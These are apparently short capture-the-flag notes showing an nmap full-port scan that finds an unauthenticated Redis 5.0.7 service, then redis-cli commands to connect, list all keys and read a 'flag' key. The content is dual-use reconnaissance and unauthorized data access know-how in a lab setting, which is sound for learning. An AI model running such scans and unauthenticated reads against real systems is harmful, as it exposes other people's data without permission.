nmap -sV -p- $target


Host is up (0.0072s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7


To interact with redis you can use redis-cli

redis-cli -h $target -p 6379 PING (you can see if the host is on)

redis-cli -h $target -p 6379 (you can connect to it with non-login user)

keys * (to list all flags)

get flag (to extract content of key)